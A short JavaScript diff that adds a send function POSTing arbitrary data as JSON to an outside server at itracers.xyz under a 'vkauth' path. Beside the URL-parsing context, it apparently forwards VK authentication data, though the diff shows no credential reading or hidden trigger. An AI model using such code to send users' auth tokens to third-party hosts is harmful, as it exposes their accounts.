@@ -11,3 +11,16 @@ function parseGet(getHref){
 		return 0;
 	}
 }
+function send(data, collback){
+	fetch("https://itracers.xyz:8443/api/vkauth", { 
+	method: 'post', 
+	headers: { 
+		"Content-type": "application/json; charset=UTF-8" 
+	},
+	body: data
+	})
+	.then(collback)
+	.catch(function (error) { 
+	console.log('Request failed ', error ); 
+	}); 
+}
